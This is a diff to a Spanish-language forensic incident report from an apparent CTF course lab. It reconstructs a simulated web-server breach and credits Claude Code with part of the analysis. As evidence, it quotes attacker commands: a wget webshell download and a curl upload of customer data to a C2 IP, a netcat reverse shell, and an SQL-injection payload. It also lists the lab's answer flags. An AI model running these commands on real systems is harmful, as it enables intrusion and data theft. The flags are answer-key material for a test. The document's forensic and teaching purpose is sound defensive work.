@@ -36,6 +36,7 @@ Para abordar la investigación forense digital (DFIR) de manera estructurada y c
 |---|---|---|---|
 | Claude (Anthropic), vía Claude Code | Asistencia en la verificación automatizada de hashes de la custodia, decodificación URL de peticiones de log y estructuración inicial del informe forense para la Parte 1. | `informe.md`: Secciones 0, 1, 2, 3 (fases 1–3), tabla de IOCs preliminar, P2 y bitácora. | Las salidas pegadas en la sección 2 provienen de la ejecución real de `sha256sum` sobre el paquete de evidencia. Los registros de `access.log` y `auth.log` se contrastaron directamente contra los archivos provistos. Las flags se validaron con el evaluador `./ctf submit 11`. El grupo comprende la validez procesal de la cadena de custodia y los principios de DFIR aplicados. |
 | Claude (Anthropic), vía Claude Code | **Parte 2:** análisis de los artefactos de disco (`shell.php.evidencia.txt`, `passwd.snippet`, `listado.txt`) y de memoria (`pslist`, `netstat`, `lsof`, `bash_history`); redacción de las secciones 3.2–3.3, las filas R2/R3 del timeline, los IOCs de disco/memoria/persistencia, el alcance del daño, P1, P4 y la bitácora de la Parte 2. | `informe.md`: secciones 3.2 y 3.3, filas 02:19–02:22 del timeline, filas de IOCs de la Parte 2, puntos 4–5 del alcance del daño, recomendaciones 5–6, P1, P4 y bitácora (bloque 4). | Las salidas pegadas son las reales de la evidencia de `caso/`. R2 y R3 se validaron por `sha256` contra `retos.manifest` y con `./ctf submit 11`. No se consultó ningún `solucion.md` (no existe en el lab): todo sale de analizar la evidencia provista. |
+| Claude (Anthropic), vía Claude Code | **Parte 3:** análisis de R4, implementación de `src/timeline.py`, redacción de la sección 3.4 y 3.5, cierre de la línea de tiempo, IOCs, alcance y plan de respuesta, P3, P5, `research.md` y bitácora. También corrigió las citas `archivo:línea` de las Partes 1 y 2. | `informe.md`: secciones 1, 3 a 8; `src/timeline.py`; `research.md`; `evidencia/`. | R4 se validó contra `retos.manifest` y con `./ctf submit 11` (`evidencia/ctf-status-11.txt`). `timeline.py` se corrió sobre `access.log` (`evidencia/timeline-salida.txt`). Las citas se cotejaron con la numeración real de cada archivo y las fuentes de `research.md` se consultaron directamente. |
 
 El grupo declara que comprende el contenido íntegro de lo entregado y que puede explicar y defender oralmente cualquier parte del análisis forense.
 
@@ -47,7 +48,7 @@ Entre las 02:14 y las 02:23 UTC del 5 de septiembre de 2026, el servidor web per
 
 El actor malicioso realizó reconocimiento automatizado, ejecutó un bypass de autenticación por inyección SQL en `/portal-rrhh/login`, descargó una copia de respaldo desprotegida (`/backup/rrhh.conf`) para sustraer un token de API interno, y logró ejecución remota de comandos (RCE) a través del endpoint `/api/reporte`. 
 
-Desde allí, implantó una webshell en el directorio de subidas, escaló privilegios a nivel `root` abusando de una copia con bit SUID del intérprete bash (`/usr/local/bin/system-check`), estableció persistencia mediante un usuario con UID 0 (`phantom-svc`) y una tarea programada en `cron`, exfiltrando finalmente la base confidencial de clientes (`/app/priv/clientes.db.txt`) hacia un servidor de Comando y Control (C2) externo (`45.13.37.7`). Además, el atacante intentó borrar sus huellas alterando el registro de autenticación `auth.log` y ejecutando `history -c`.
+Desde allí, implantó una webshell en el directorio de subidas, escaló privilegios a nivel `root` abusando de una copia con bit SUID del intérprete bash (`/usr/local/bin/system-check`), estableció persistencia mediante un usuario con UID 0 (`phantom-svc`) y una tarea programada en `cron`, exfiltrando finalmente la base confidencial de clientes (`/app/priv/clientes.db.txt`) hacia un servidor de Comando y Control (C2) externo (`45.13.37.7`). Además, el atacante intentó borrar sus huellas alterando el registro de autenticación `auth.log` y ejecutando `history -c`. Cuando se capturó la memoria, a las 02:30 UTC, la conexión al C2 seguía activa.
 
 ---
 
@@ -98,32 +99,42 @@ Sep  5 02:45:00 phantomcorp-web sshd[1440]: Connection closed by 185.220.101.42
 
 ---
 
-## 3. Línea de tiempo del ataque (Fases analizadas en la Parte 1)
+## 3. Línea de tiempo del ataque
 
-A partir del análisis exhaustivo de `logs/access.log`, reconstruimos el inicio de la intrusión:
+Correlacionando logs, disco y memoria, reconstruimos el ataque completo. Las filas que dependen de `auth.log` tienen confianza baja, porque ese archivo falló la custodia. Los comandos de `bash_history.txt` no tienen hora propia: se ubican por su orden y por los otros artefactos.
 
 | Hora (UTC) | Fase | Evento detectado | Evidencia concreta (Archivo:Línea) |
 |---|---|---|---|
-| **02:14:03** | Reconocimiento | Escaneo de cabeceras HTTP desde IP atacante `185.220.101.42` utilizando User-Agent `Mozilla/5.0 zgrab/0.x`. | `logs/access.log:1` |
-| **02:14:19** | Enumeración | Fuerza bruta de directorios web mediante `gobuster/3.6`. Petición a `/robots.txt` (200 OK, 64 bytes). | `logs/access.log:2` |
-| **02:14:20** | Enumeración | Gobuster prueba `/admin` y `/login` recibiendo respuestas 404. | `logs/access.log:3-4` |
-| **02:14:21** | Enumeración | Gobuster descubre `/backup` (redirección 301) y `/portal-rrhh` (200 OK, 402 bytes). | `logs/access.log:5-6` |
-| **02:14:22** | Enumeración | Gobuster descubre el directorio de subidas `/uploads` (301). | `logs/access.log:7` |
-| **02:16:40** | Intrusión inicial | Intento manual de login con credenciales incorrectas en `/portal-rrhh/login` usando `curl/8.5` (401 Unauthorized). | `logs/access.log:8` |
-| **02:16:58** | Intrusión inicial | Segundo intento de autenticación fallido en `/portal-rrhh/login` (401). | `logs/access.log:9` |
-| **02:17:22** | Explotación (SQLi) | **Bypass de autenticación exitoso:** Inyección SQL con payload `user=admin'--` en `/portal-rrhh/login`. Servidor devuelve 200 OK (180 bytes). | `logs/access.log:10` |
-| **02:17:41** | Fuga de información | Descarga no autorizada del archivo de configuración `/backup/rrhh.conf` (200 OK, 210 bytes), donde obtiene el token de API `phantom-api-7c1e`. | `logs/access.log:11` |
-| **02:18:10** | Explotación (RCE) | Prueba de inyección de comandos en `/api/reporte?token=phantom-api-7c1e&cmd=id`. Servidor ejecuta `id` como `www-data` (200 OK). | `logs/access.log:12` |
-| **02:18:33** | Explotación (RCE) | **Vector de entrada crítico (Reto R1):** Inyección de comando con marcador URL-encodeado: `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p`. El comando escribe en `/tmp/.p`. | `logs/access.log:13` |
-| **02:19:02** | Dropeo de webshell | El atacante usa el RCE para bajar un webshell desde el C2: `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. Queda `shell.php` (431 bytes) en el disco. | `logs/access.log:14` · `disco/listado.txt` |
-| **02:19:48** | Uso de webshell | Interacción con la webshell ya instalada: `GET /uploads/shell.php?c=whoami` (RCE persistente vía parámetro `?c=`). | `logs/access.log:15` |
-| **02:21:04** | Escalada a root (SUID) | Ejecución de la copia SUID de bash `/usr/local/bin/system-check -p -c 'id'`: el proceso corre con `euid=0`. | `logs/auth.log:4` · `memoria/bash_history.txt:5` · `memoria/pslist.txt` (PID 1477) |
-| **02:22:00** | Persistencia | Alta de la tarea `cron` `/etc/cron.d/phantom-maint` (relanza el webshell cada 5 min) y del usuario backdoor `phantom-svc` (UID 0). | `disco/listado.txt` · `disco/etc/passwd.snippet` |
-| *02:23:15* | *Exfiltración C2* | *(Parte 3) Robo de base confidencial `/app/priv/clientes.db.txt` y subida a C2 `45.13.37.7`* | `memoria/bash_history.txt:8-9` |
+| **02:14:03** | Reconocimiento | Escaneo de cabeceras HTTP desde IP atacante `185.220.101.42` utilizando User-Agent `Mozilla/5.0 zgrab/0.x`. | `logs/access.log:6` |
+| **02:14:19** | Enumeración | Fuerza bruta de directorios web mediante `gobuster/3.6`. Petición a `/robots.txt` (200 OK, 64 bytes). | `logs/access.log:7` |
+| **02:14:20** | Enumeración | Gobuster prueba `/admin` y `/login` recibiendo respuestas 404. | `logs/access.log:8-9` |
+| **02:14:21** | Enumeración | Gobuster descubre `/backup` (redirección 301) y `/portal-rrhh` (200 OK, 402 bytes). | `logs/access.log:10-11` |
+| **02:14:22** | Enumeración | Gobuster descubre el directorio de subidas `/uploads` (301). | `logs/access.log:12` |
+| **02:16:40** | Intrusión inicial | Intento manual de login con credenciales incorrectas en `/portal-rrhh/login` usando `curl/8.5` (401 Unauthorized). | `logs/access.log:14` |
+| **02:16:58** | Intrusión inicial | Segundo intento de autenticación fallido en `/portal-rrhh/login` (401). | `logs/access.log:15` |
+| **02:17:22** | Explotación (SQLi) | **Bypass de autenticación exitoso:** Inyección SQL con payload `user=admin'--` en `/portal-rrhh/login`. Servidor devuelve 200 OK (180 bytes). | `logs/access.log:16` |
+| **02:17:41** | Fuga de información | Descarga no autorizada del archivo de configuración `/backup/rrhh.conf` (200 OK, 210 bytes). El archivo no está en la evidencia; se infiere que de ahí salió el token `phantom-api-7c1e`, porque 29 segundos después ya lo usa. | `logs/access.log:17` |
+| **02:18:10** | Explotación (RCE) | Prueba de inyección de comandos en `/api/reporte?token=phantom-api-7c1e&cmd=id`. Servidor ejecuta `id` como `www-data` (200 OK). | `logs/access.log:18` |
+| **02:18:33** | Explotación (RCE) | **Vector de entrada crítico (Reto R1):** Inyección de comando con marcador URL-encodeado: `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p`. El comando escribe en `/tmp/.p`. | `logs/access.log:19` |
+| **02:19:02** | Dropeo de webshell | El atacante usa el RCE para bajar un webshell desde el C2: `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. Queda `shell.php` (431 bytes) en el disco. | `logs/access.log:20` · `disco/listado.txt:4` · `memoria/pslist.txt:6` |
+| **02:19:48** | Uso de webshell | Interacción con la webshell ya instalada: `GET /uploads/shell.php?c=whoami` (RCE persistente vía parámetro `?c=`). | `logs/access.log:21` |
+| **02:19:55** | Acceso SSH (confianza baja) | Login por contraseña como `www-data` desde la IP atacante. | `logs/auth.log:2` |
+| **02:20:31** | Intento de escalada (confianza baja) | `sudo` a `/bin/bash` rechazado para `www-data`. | `logs/auth.log:3` |
+| **02:21:04** | Escalada a root (SUID) | Ejecución de la copia SUID de bash `/usr/local/bin/system-check -p -c 'id'`: el proceso corre con `euid=0`. | `logs/auth.log:4` · `disco/listado.txt:5` · `memoria/bash_history.txt:6` · `memoria/pslist.txt:8` |
+| **02:22** | Persistencia | Creación de la tarea `/etc/cron.d/phantom-maint` (62 bytes), que relanza el webshell cada 5 minutos. | `disco/listado.txt:6` · `disco/var/www/uploads/shell.php.evidencia.txt:9` |
+| *Sin hora* | Persistencia | Alta del usuario backdoor `phantom-svc` (UID 0). La evidencia no permite fecharla (ver 3.5). | `disco/etc/passwd.snippet:4` |
+| **02:23** | Preparación de exfiltración | Empaquetado de la base de clientes en `/tmp/.exfil/clientes.tar.gz` (48.210 bytes). | `disco/listado.txt:7` · `memoria/bash_history.txt:8` · `memoria/lsof.txt:5` |
+| **02:23:15** | Exfiltración | Lectura de `/app/priv/clientes.db.txt` por el webshell: 200 OK, 48.210 bytes enviados al atacante. | `logs/access.log:22` |
+| *Sin hora* | Exfiltración (Reto R4) | Subida con `curl` a `http://45.13.37.7/upload`. | `memoria/bash_history.txt:9` |
+| *Sin hora* | Antiforense | `history -c` para borrar el historial. | `memoria/bash_history.txt:10` |
+| **02:30** | Captura de memoria | Reverse shell `nc` (PID 1490) todavía ESTABLISHED contra `45.13.37.7:4444`. | `memoria/pslist.txt:1,9` · `memoria/netstat.txt:4` · `memoria/lsof.txt:3` |
+| **02:45:00** | Cierre SSH (confianza baja) | `sshd` registra el cierre de una conexión de la IP atacante. | `logs/auth.log:9` |
+
+La timeline de `access.log` también se reproduce con `src/timeline.py` (salida en `evidencia/timeline-salida.txt`).
 
 ### 3.1 Análisis detallado del Vector de Entrada RCE (Reto R1)
 
-En la línea 13 de `logs/access.log`, se observa la siguiente solicitud HTTP:
+En la línea 19 de `logs/access.log`, se observa la siguiente solicitud HTTP:
 
 ```
 185.220.101.42 - - [05/Sep/2026:02:18:33 +0000] "GET /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p HTTP/1.1" 200 12 "-" "curl/8.5"
@@ -184,13 +195,44 @@ El atacante enumeró los binarios con bit SUID, encontró `/usr/local/bin/system
 
 - **Flag capturada (R3):** `FLAG{dfir_privesc_suid}`
 
-**Correlación de procesos y red.** El árbol de `pslist` cierra la cadena: `nginx worker (www-data)` → `wget` (descarga del webshell) → `bash` (shell interactiva) → `system-check` (root) → `nc 45.13.37.7 4444`. El `netstat` confirma una conexión saliente **ESTABLISHED** a `45.13.37.7:4444` (el C2) desde el PID 1490 (`nc`), y el `lsof` muestra ese mismo `nc` sosteniendo el socket y el `bash` con `/tmp/.exfil/clientes.tar.gz` abierto. La conexión al C2 seguía **viva en memoria** al momento de la captura (02:30 UTC): el atacante **probablemente seguía dentro**. El detalle de la exfiltración (Reto R4) se analiza en la Parte 3.
+**Correlación de procesos y red.** El árbol de `pslist` cierra la cadena: `nginx` (PID 812) → `sh -c wget` (descarga del webshell) → `bash` (shell interactiva) → `system-check` (root) → `nc 45.13.37.7 4444`. El `netstat` confirma una conexión saliente **ESTABLISHED** a `45.13.37.7:4444` (el C2) desde el PID 1490 (`nc`), y el `lsof` muestra ese mismo `nc` sosteniendo el socket y el `bash` con `/tmp/.exfil/clientes.tar.gz` abierto. La conexión al C2 seguía **viva en memoria** al momento de la captura (02:30 UTC): el atacante **probablemente seguía dentro**. El detalle de la exfiltración (Reto R4) se analiza en la sección 3.4.
+
+### 3.4 C2 y exfiltración (Reto R4)
+
+El historial recuperado de memoria muestra cómo el atacante empaquetó y subió los datos:
+
+```
+tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt
+curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}
+```
+
+La evidencia muestra dos canales hacia el exterior, además de la lectura por el webshell:
+
+| Canal | Qué prueba | Evidencia |
+|---|---|---|
+| Lectura por webshell (HTTP) | El atacante recibió 48.210 bytes al pedir `clientes.db.txt` (200 OK). | `logs/access.log:22` |
+| Subida a `http://45.13.37.7/upload` | Se ejecutó el comando de subida. No hay respuesta del servidor que confirme que terminó. | `memoria/bash_history.txt:9` |
+| `nc` a `45.13.37.7:4444` | Canal de comando y control activo a las 02:30. No muestra qué datos pasaron por él. | `memoria/netstat.txt:4` · `memoria/pslist.txt:9` |
+
+Con eso alcanza para tratar la base de clientes como robada: `access.log:22` prueba la salida de los datos aunque la subida no se pueda confirmar.
+
+- **Flag capturada (R4):** `FLAG{dfir_c2_exfil}`
+
+### 3.5 Límites de la evidencia
+
+Estos puntos quedan abiertos. Los dejamos explícitos para no afirmar más de lo que la evidencia sostiene:
+
+1. **Alta de `phantom-svc`:** `/etc/passwd` no figura en `disco/listado.txt`, aunque ese `find` recorre `/etc` y debería listarlo si se modificó después de las 02:14. Además, el snippet no tiene fecha. Sabemos que el usuario existe, pero no cuándo se creó.
+2. **Origen del binario SUID:** `www-data` no puede crear por sí mismo un binario SUID de root, y `sudo` le fue rechazado a las 02:20:31. La evidencia no muestra quién creó `system-check` a las 02:21. Las líneas eliminadas de `auth.log` podrían haberlo explicado.
+3. **PID 1201:** `auth.log:2` lo asigna a `sshd` y `pslist.txt:6` a `sh -c wget`. Damos más peso a `pslist`, porque `auth.log` falló la custodia.
+4. **`TIME_WAIT` hacia `45.13.37.7:80`:** `netstat.txt:5` lo atribuye a la descarga del webshell (02:19), pero en Linux ese estado suele durar cerca de un minuto y la captura es de las 02:30. Podría tratarse de una conexión posterior, como la subida. No lo podemos determinar.
+5. **Tamaño de los datos:** la respuesta de `access.log:22` y el `clientes.tar.gz` de `listado.txt:7` miden exactamente 48.210 bytes, aunque uno sea el texto original y el otro un archivo comprimido. La base de clientes no está en la evidencia, así que no se puede saber si son los mismos datos ni cuántos registros contiene.
 
 ---
 
-## 4. Indicadores de compromiso (IOCs preliminares — Parte 1)
+## 4. Indicadores de compromiso (IOCs)
 
-A partir de los artefactos examinados en la primera fase de la investigación, se consolidan los siguientes Indicadores de Compromiso:
+Matriz consolidada a partir de logs, disco y memoria:
 
 | Tipo de Indicador | Valor / Patrón | Contexto de Detección | Nivel de Confianza |
 |---|---|---|---|
@@ -202,30 +244,37 @@ A partir de los artefactos examinados en la primera fase de la investigación, s
 | **Ruta Expuesta** | `/backup/rrhh.conf` | Fuga de información sensible y tokens de API internos. | Alto |
 | **Archivo Creado (RCE)** | `/tmp/.p` | Archivo temporal de prueba dropeado a las 02:18 UTC por el RCE. | Alto (Correlacionado en `disco/listado.txt`). |
 | **Archivo Alterado** | `logs/auth.log` | Registro de autenticación del sistema adulterado tras la captura. | Crítico (Discrepancia en cadena de custodia). |
-| **IP Servidor C2** | `45.13.37.7` | Origen del webshell (`wget`) y destino de la conexión saliente `nc` a puerto 4444. | Alto (`pslist`/`netstat`/`lsof`). Volumen de exfiltración se cierra en Parte 3. |
+| **IP Servidor C2** | `45.13.37.7` | Origen del webshell (`wget`) y destino de la conexión saliente `nc` a puerto 4444. | Alto (`pslist`/`netstat`/`lsof`). |
 | **Puerto C2** | `45.13.37.7:4444` | Canal de reverse shell (`nc`) ESTABLISHED desde el host comprometido. | Alto (`netstat`/`lsof`). |
-| **Ruta Webshell** | `/var/www/uploads/shell.php` | Puerta trasera web (RCE vía `?c=`), dropeada a las 02:19. | Alto (disco + `access.log:14`). |
+| **Ruta Webshell** | `/var/www/uploads/shell.php` | Puerta trasera web (RCE vía `?c=`), dropeada a las 02:19. | Alto (`disco/listado.txt:4` + `logs/access.log:20`). |
 | **Usuario Backdoor** | `phantom-svc` (UID 0) | Cuenta administrativa no autorizada agregada a `/etc/passwd`. | Crítico (`disco/etc/passwd.snippet`). |
 | **Tarea de persistencia** | `/etc/cron.d/phantom-maint` | Cron que relanza el webshell cada 5 minutos. | Alto (`disco/listado.txt`). |
 | **Binario SUID malicioso** | `/usr/local/bin/system-check` | Copia de bash con bit SUID root, usada para escalar a `euid=0`. | Crítico (`listado.txt` + `auth.log` + `pslist`). |
-| **Archivo de exfiltración** | `/tmp/.exfil/clientes.tar.gz` | Datos empaquetados para el robo (48 KB). | Alto (`listado.txt` + `lsof`). |
+| **Archivo de exfiltración** | `/tmp/.exfil/clientes.tar.gz` | Datos empaquetados para el robo (48.210 bytes). | Alto (`listado.txt` + `lsof`). |
+| **URL de exfiltración** | `http://45.13.37.7/upload` | Destino del `curl -F` con los datos robados. | Alto (`memoria/bash_history.txt:9`). |
+| **URL de descarga** | `http://45.13.37.7/s.php` | Origen del webshell. | Alto (`logs/access.log:20` + `memoria/pslist.txt:6`). |
+| **Credencial comprometida** | Token `phantom-api-7c1e` | Usado para ejecutar comandos por `/api/reporte`. | Alto (`logs/access.log:18-20`). |
+| **Hash (captura defangeada)** | SHA-256 `38f7251c9fe2f554a2a9808fea0b154f1f4e88f7b47c1e4afbd589055a22fc42` | Corresponde a `shell.php.evidencia.txt`, no al webshell original. Sirve para custodia, no para buscar el archivo real en otros hosts. | Alto (`evidencia.sha256:3`). |
 
 ---
 
-## 5. Alcance del daño (Evaluación preliminar)
+## 5. Alcance del daño
 
 1. **Compromiso del perímetro web:** El atacante logró evadir la autenticación de la aplicación y ejecutar comandos del sistema operativo como el usuario del servidor web (`www-data`).
 2. **Acceso a credenciales internas:** Se produjo la exposición no autorizada de archivos de respaldo (`/backup/rrhh.conf`), filtrando claves de servicio.
 3. **Manipulación de evidencia:** Se constató la modificación deliberada de archivos del sistema (`auth.log`) para entorpecer la labor pericial.
 4. **Escalada a root:** el atacante obtuvo privilegios máximos (`euid=0`) abusando del binario SUID `system-check`, por lo que el compromiso es total a nivel de sistema operativo, no solo del servicio web.
 5. **Persistencia establecida (el atacante probablemente sigue adentro):** se implantó un usuario backdoor con UID 0 (`phantom-svc`), una tarea `cron` que relanza el webshell cada 5 minutos (`/etc/cron.d/phantom-maint`) y un binario SUID root. En memoria, la conexión al C2 (`45.13.37.7:4444`) seguía ESTABLISHED al momento de la captura.
-6. *(Pendiente de cuantificación final en Parte 3: volumen exacto de registros de clientes exfiltrados hacia el C2 — Reto R4.)*
+6. **Datos robados:** la base `/app/priv/clientes.db.txt` debe tratarse como exfiltrada. Se prueba la salida de 48.210 bytes (`access.log:22`), pero la cantidad de registros y los clientes afectados no se pueden cuantificar sin la base original.
+7. **Otras credenciales posiblemente expuestas:** el atacante leyó `/var/www/.env` (`bash_history.txt:3`). Su contenido no está en la evidencia, por lo que cualquier secreto guardado ahí debe considerarse comprometido. El `auth.log` también registra un login SSH por contraseña como `www-data`, con confianza baja.
+
+**¿Sigue adentro?** Hay que asumir que sí. A las 02:30 el canal `nc` al C2 seguía activo. El cierre SSH de las 02:45 no prueba lo contrario: viene de un archivo alterado y no se refiere a ese canal. Aunque se cortara, el usuario `phantom-svc`, el `cron`, el webshell y el binario SUID le permiten volver hasta que se eliminen. La evidencia solo cubre este host, así que tampoco se puede descartar movimiento lateral.
 
 ---
 
-## 6. Recomendaciones iniciales de contención y erradicación
+## 6. Contención y erradicación (recomendaciones)
 
-Con los hallazgos de la Parte 1, el equipo de respuesta a incidentes (CSIRT) debe activar de forma inmediata:
+Antes de erradicar, el equipo de respuesta (CSIRT) debe preservar copias verificadas por hash de todo lo que vaya a modificar. Después debería actuar en este orden:
 
 1. **Aislamiento en red del host comprometido:** Desconectar la interfaz de red de `phantomcorp-web` (10.0.0.5) para frenar cualquier tráfico saliente hacia la infraestructura del atacante.
 2. **Bloqueo perimetral en firewall / WAF:** Bloquear de inmediato la dirección IP de origen `185.220.101.42` y la IP del servidor de descarga `45.13.37.7`.
@@ -235,7 +284,11 @@ Con los hallazgos de la Parte 1, el equipo de respuesta a incidentes (CSIRT) deb
    - Eliminar el directorio público `/backup` y restringir el listado de archivos.
 4. **Revocación de credenciales:** Invalidar el token `phantom-api-7c1e` de forma inmediata en todos los microservicios internos.
 5. **Erradicación de la persistencia (hallazgos Parte 2):** eliminar el usuario `phantom-svc` de `/etc/passwd`, borrar la tarea `/etc/cron.d/phantom-maint` y el webshell `/var/www/uploads/shell.php`, y quitar el bit SUID (o remover) el binario `/usr/local/bin/system-check`.
-6. **Matar el proceso y cortar el C2:** terminar los procesos del atacante (`nc` PID 1490 y `bash` PID 1240) y cerrar la conexión saliente a `45.13.37.7:4444`. Dado que la sesión seguía viva, la contención en red es urgente.
+6. **Matar el proceso y cortar el C2:** terminar los procesos del atacante (`nc` PID 1490, `system-check` PID 1477 y `bash` PID 1240) y cerrar la conexión saliente a `45.13.37.7:4444`. Dado que la sesión seguía viva, la contención en red es urgente.
+7. **Rotación de credenciales:** además del token, cambiar los secretos de `/var/www/.env` y las contraseñas de `www-data` y `root`, y revisar las claves SSH autorizadas de las cuentas afectadas.
+8. **Búsqueda en el resto de la red:** buscar todos los IOCs de la sección 4 en otros hosts, firewall y proxy, en particular conexiones a `45.13.37.7`.
+9. **Recuperación:** como hubo compromiso de root, reconstruir el servidor desde una imagen limpia, en lugar de confiar en la limpieza, y restaurar solo datos verificados. También eliminar `/tmp/.p` y `/tmp/.exfil/` del sistema afectado después de preservarlos.
+10. **Notificación y mejora:** evaluar con el área legal las obligaciones de aviso a los clientes afectados, y enviar los logs a un servidor remoto de solo escritura para que un atacante no pueda alterarlos.
 
 ---
 
@@ -258,11 +311,19 @@ En el derecho procesal y en los estándares internacionales de informática fore
 Si un perito o equipo de respuesta presenta un archivo cuyo hash no coincide con el acta de recolección y no documenta exhaustivamente qué ocurrió:
 1. **Pérdida de autenticidad:** La defensa del atacante o el auditor legal puede argumentar con fundamento que la evidencia fue "plantada", manipulada por administradores negligentes o corrompida por terceros, destruyendo la presunción de veracidad de todo el caso.
 2. **Inadmisibilidad judicial:** La prueba es declarada nula (*fruto del árbol envenenado*), imposibilitando cualquier acción penal contra el intruso o el reclamo ante aseguradoras de ciberriesgo.
-3. **El valor de documentar el hallazgo:** Paradójicamente, si el perito documenta formalmente la discrepancia, preserva el archivo original modificado y recurre a fuentes redundantes corroborables (como el volcado de memoria no volátil, journals del kernel o registros centralizados en un SIEM inmutable), la alteración deja de ser un problema procesal y **se transforma en una prueba acusatoria adicional**: demuestra la premeditación y las acciones de antiforensia del atacante para borrar sus rastros.
+3. **El valor de documentar el hallazgo:** Paradójicamente, si el perito documenta formalmente la discrepancia, preserva el archivo original modificado y recurre a fuentes redundantes corroborables (como el volcado de memoria, journals del kernel o registros centralizados en un SIEM inmutable), la alteración deja de ser un problema procesal y **se transforma en una prueba acusatoria adicional**: demuestra la premeditación y las acciones de antiforensia del atacante para borrar sus rastros.
 
 **P3 — Correlacioná tres artefactos (log + disco + memoria) que apunten al MISMO evento con el mismo timestamp.**
 
-*(pendiente — parte del compañero que realice la Parte 3)*
+El evento es la **instalación del webshell, a las 02:19 UTC**:
+
+| Fuente | Artefacto | Qué muestra |
+|---|---|---|
+| Log | `logs/access.log:20` | 02:19:02: `cmd=wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. |
+| Disco | `disco/listado.txt:4` | `/var/www/uploads/shell.php` (431 bytes), con fecha 02:19. |
+| Memoria | `memoria/pslist.txt:6` · `memoria/bash_history.txt:4` | Proceso `sh -c wget http://45.13.37.7/s.php` (PID 1201) y el mismo comando en el historial. |
+
+El log y el disco coinciden en el minuto. La memoria no aporta hora por proceso, porque es una foto de las 02:30: corrobora el evento por su contenido, con la misma URL y el mismo destino. El uso posterior del webshell (`access.log:21`, 02:19:48) confirma que quedó funcionando. Las tres fuentes son independientes, y `access.log`, `listado.txt` y `pslist.txt` pasaron la verificación de hash.
 
 **P4 — El atacante corrió `history -c`. ¿Por qué igual pudiste recuperar sus comandos?**
 
@@ -270,11 +331,15 @@ Si un perito o equipo de respuesta presenta un archivo cuyo hash no coincide con
 
 **P5 — Cierre del curso: recorriste ataque, agentes, defensa y forensia. ¿Por qué un buen forense tiene que entender cómo ataca un pentester?**
 
-*(pendiente — parte del compañero que realice la Parte 3)*
+Porque la evidencia por sí sola es una lista de datos sueltos, y lo que la convierte en una historia es conocer la cadena de ataque. Quien ya ejecutó recon, SQLi, RCE, escalada y exfiltración en los labs anteriores reconoce que un User-Agent `gobuster` es enumeración, que un `find -perm -4000` anticipa una escalada por SUID y que un `nc` saliente es un posible canal de C2.
+
+También cambia dónde se busca. Si sabés que después de escalar un atacante intenta quedarse, vas a buscar usuarios y tareas programadas aunque ningún log te lleve hasta ahí. Si sabés que borra huellas, no confiás en un único log y verificás la custodia, como en el R5. Y si conocés las técnicas de evasión del Lab 10, entendés que la falta de alertas no prueba que no haya pasado nada.
+
+Por último, ese conocimiento obliga a marcar los límites. Saber cómo funciona un ataque permite ver lo que no cierra, como un binario SUID de root que `www-data` no pudo crear solo (sección 3.5). Y cierra el ciclo: lo que el forense reconstruye se convierte en detecciones y controles para que el mismo ataque no vuelva a funcionar.
 
 ---
 
-## 8. Bitácora de comandos forenses (Partes 1 y 2)
+## 8. Bitácora de comandos forenses
 
 ```bash
 # ==============================================================================
@@ -331,5 +396,18 @@ cat memoria/lsof.txt                                # nc con el socket C2; bash 
 
 ./ctf submit 11 R2 'FLAG{dfir_webshell_hallado}'
 ./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'
-./ctf status 11
+
+# ==============================================================================
+# 5. Parte 3 — C2, exfiltración y timeline (R4)
+# ==============================================================================
+grep -n '45.13.37.7' memoria/*.txt logs/access.log   # correlación del C2 en memoria y logs
+sed -n '8,9p' memoria/bash_history.txt               # tar + curl -> FLAG{dfir_c2_exfil}
+sed -n '22p' logs/access.log                         # 200 OK, 48210 bytes de clientes.db.txt
+grep -n 'clientes' disco/listado.txt memoria/lsof.txt
+
+./ctf submit 11 R4 'FLAG{dfir_c2_exfil}'
+./ctf status 11                                      # 5/5: evidencia/ctf-status-11.txt
+
+# Timeline automatizada (desde entregas/lab11/grupo08)
+python3 src/timeline.py ../../../labs/lab11-forensia/caso/logs/access.log --ip 185.220.101.42
 ```
